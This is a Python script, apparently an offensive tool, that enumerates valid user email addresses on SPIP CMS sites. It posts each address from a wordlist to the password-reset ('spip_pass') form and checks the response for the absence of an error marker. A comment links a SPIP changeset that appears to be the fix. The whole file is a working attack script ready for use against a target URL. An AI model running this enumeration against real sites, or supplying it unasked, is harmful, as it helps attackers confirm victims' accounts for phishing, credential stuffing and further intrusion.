import requests
import re
import argparse
from bs4 import BeautifulSoup

# https://zone.spip.net/trac/spip-zone/changeset/117577/spip-zone

class Tester:
    def __init__(self, url, verbose):
        self.url = url
        self.verbose = verbose
        self.session = ""
        self.form_value = ""
        self.init_session()

    def init_session(self):
        self.session = requests.Session()
        r = self.session.get(target_url)

        soup = BeautifulSoup(r.text, "html.parser")
        a = soup.find("input", {"name": "formulaire_action_args"})
        self.form_value = a["value"]

    def test_mail(self, mail):
        data = {"page": "spip_pass", "lang": "fr", "formulaire_action": "oubli", "formulaire_action_args": self.form_value, "oubli": mail, "nobot": ""}
        r = self.session.post(self.url, data=data)

        if(self.verbose):
            print(f"[*] Testing {mail} ...")

        if "<b>Erreur :</b>" not in r.text:
            print(f"[+] Found a valid mail : {mail}")


def parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Base Target URL (without the spip.php)", required=True)
    parser.add_argument("-f", "--file", help="File containing the mails to test", required=True)
    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")

    args = parser.parse_args()
    return args

if __name__ == "__main__":
    args = parser()

    url = args.url
    mail_file = args.file
    verbose = args.verbose
    
    with open(mail_file, "r") as f:
        mails = f.readlines()
    f.close()

    target_url = url + "/spip.php?page=spip_pass&lang=fr"
    tester = Tester(target_url, verbose)

    print("[*] Starting ...")
    for mail in mails:
        mail = mail.strip()
        tester.test_mail(mail)
    print("[*] Finished")
